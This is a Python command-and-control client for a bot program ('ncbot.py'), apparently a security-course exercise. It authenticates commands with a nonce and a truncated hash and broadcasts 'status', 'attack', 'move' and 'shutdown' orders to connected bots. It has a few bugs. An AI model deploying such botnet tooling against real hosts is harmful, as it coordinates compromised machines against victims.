# controller program for the ncbot.py program

#command line argument:
# ./nccontroller.py <hostname>:<port> <secret-phrase>

import argparse
import socket
import sys
import os
#import base64
import hashlib
import shlex
import time
from array import *
import uuid
import select

# List of used nonces
used_nonces = list()

# Argument Parsing
def parse_args():
    parser = argparse.ArgumentParser(
        prog='client',
        description='client connects to server')
    parser.add_argument('hostname_port', help='hostname and port of the server')
    parser.add_argument('secret', help='secret-phrase')
    return parser.parse_args()

# Get random nonce make sure it hasnt been used before
def calc_nonce():
    # Generate nonce
    nonce = uuid.uuid4().hex    
    while(nonce in used_nonces):
        nonce = uuid.uuid4().hex
    
    # After generating, put in used list
    used_nonces.append(nonce)
    return nonce

# Receive status data from all bots, parsed so every bot's output is received
def recieve_status_data(sock: socket):
    i = 0
    j = 0
    bot_status = list()
    while i < 5:
        read_data = [sock]
        write_data = []
        error_data = []
        readList, writeList, errorList = select.select(read_data, write_data, error_data, 1.0)
        if readList:
            response = sock.recv(1024).decode()
            data = response.split()
            bot_status.append(data[1] + " " + data[2])
            j = j + 1       #counts number of bots which sent data back
        else:
            # Waits for 5 seconds
            i = i + 1

    print("Result: ", j, " bots discovered.")
    status_string = ""
    for bot in bot_status:
        status_string = status_string + " " + bot.rstrip("\n") + ","
    print(status_string.rstrip(","))

# Receive shutdown data from all bots, parsed so every bot's output is received
def recieve_shutdown_data(sock: socket):
    i = 0
    j = 0
    bot_status = list()
    while i < 50:
        read_data = [sock]
        write_data = []
        error_data = []
        readList, writeList, errorList = select.select(read_data, write_data, error_data, 0.1)
        if readList:

            # There is a bug when the data is recieved at the same time ..... -----------------
            response = sock.recv(1024).decode()
            data = response.split()
            bot_status.append(data[1])
            j = j + 1       #counts number of bots which sent data back

        else:
            # Waits for 5 seconds
            i = i + 1

    print("Result: ", j, " bots shutdown.")
    status_string = ""
    for bot in bot_status:
        status_string = status_string + " " + bot.rstrip("\n") + ","
    print(status_string.rstrip(","))

# Receive attack data from all bots, parsed so every bot's output is received
def recieve_attack_data(sock: socket):
    i = 0
    j = 0
    bot_attack = list()
    while i < 5:
        read_data = [sock]
        write_data = []
        error_data = []
        readList, writeList, errorList = select.select(read_data, write_data, error_data, 1.0)
        if readList:
            response = sock.recv(1024).decode()
            bot_attack.append(response)
            j = j + 1       # Counts number of bots which sent data back

        else:
            # Waits for 5 seconds
            i = i + 1

    print("Result: ", j, " bots discovered.")
    status_string = ""
    for bot in bot_attack:
        status_string = status_string + " " + bot.rstrip("\n") + ","
    print(status_string.rstrip(","))

# Receive move data from all bots, parsed so every bot's output is received
def recieve_move_data(sock: socket):
    i = 0
    j = 0
    bot_move = list()
    while i < 5:
        read_data = [sock]
        write_data = []
        error_data = []
        readList, writeList, errorList = select.select(read_data, write_data, error_data, 1.0)
        if readList:
            response = sock.recv(1024).decode()
            bot_move.append(response)
            j = j + 1       #counts number of bots which sent data back

        else:
            # Waits for 5 seconds
            i = i + 1

    print("Result: ", j, " bots discovered.")
    status_string = ""
    for bot in bot_move:
        status_string = status_string + " " + bot.rstrip("\n") + ","
    print(status_string.rstrip(","))

# Main bot controller
def bot_controller(args: str, sock: socket):
    
    # Separate arguments into usable variables
    split_hostPort = args.hostname_port.split(":")
    host = split_hostPort[0]
    port = int(split_hostPort[1])
    secret = args.secret
    command = input('cmd> ')

    while (1):
        # Flush data that was sent from bots
        # If a bot is created after the controller is turned on then will recieve extra input
        read_data = [sock]
        write_data = []
        error_data = []
        readList, writeList, errorList = select.select(read_data, write_data, error_data, 1.0)
        if readList:
            response = sock.recv(1024).decode()
            print("recieved new data from bots: ")
            print(response)

        # Sending status command to bot
        if command == "status":
            # Calculate a nonce and MAC for this command
            nonce = calc_nonce()
            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
            
            # Send the command
            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
            sock.send(nonce_mac_cmd.encode())
            
            # Receive the bot reply
            recieve_status_data(sock)
            
        # Sending shutdown command to bot
        elif command == "shutdown":
            # Calculate a nonce and MAC for this command
            nonce = calc_nonce()
            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
            
            # Send the command
            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
            sock.send(nonce_mac_cmd.encode())
            
            # Receive the bot reply
            recieve_shutdown_data(sock)
        
        # Sending attack command to bot
        elif command[0:6] == "attack":
            # Calculate a nonce and MAC for this command
            nonce = calc_nonce()
            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
            
            # Send the command
            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
            sock.send(nonce_mac_cmd.encode())
            
            # Receive the bot reply
            recieve_attack_data(sock)

        # Sending move command to bot
        elif command[0:4] == "move":
            # Calculate a nonce and MAC for this command
            nonce = calc_nonce()
            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())

            # Send the command
            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
            sock.send(nonce_mac_cmd.encode())
            
            # Receive the bot reply
            recieve_attack_data(sock)
            
        # Command to close controller
        elif command == "quit":
            print("Bye.")
            exit(1)
        else:
            print("unknown command.")

        command = input('cmd> ')
    sock.send(command.encode)
    sock.close()



def main():
    args = parse_args()

    try:
        #initially connect to server
        split_hostPort = args.hostname_port.split(":")
        host = split_hostPort[0]
        port = int(split_hostPort[1])

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))

        print("Connected.")
        bot_controller(args, client_socket)

    except ConnectionError:
        print("Connection failed. Could not connect to server")


if __name__ == '__main__':
    main()